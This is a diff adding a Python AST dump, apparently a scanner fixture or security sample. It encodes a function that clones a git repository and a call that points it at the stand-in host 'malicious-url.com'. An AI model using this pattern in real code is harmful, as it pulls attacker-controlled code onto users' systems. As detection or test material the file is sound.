@@ -1,0 +1,38 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='git')]),
+        FunctionDef(
+            name='clone_repository',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='repo_url'),
+                    arg(arg='destination')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Attribute(
+                                value=Name(id='git', ctx=Load()),
+                                attr='Repo',
+                                ctx=Load()),
+                            attr='clone_from',
+                            ctx=Load()),
+                        args=[
+                            Name(id='repo_url', ctx=Load()),
+                            Name(id='destination', ctx=Load())],
+                        keywords=[]))],
+            decorator_list=[]),
+        Expr(
+            value=Call(
+                func=Name(id='clone_repository', ctx=Load()),
+                args=[
+                    Constant(value='http://malicious-url.com/repo.git'),
+                    Constant(value='/path/to/destination')],
+                keywords=[]))],
+    type_ignores=[])
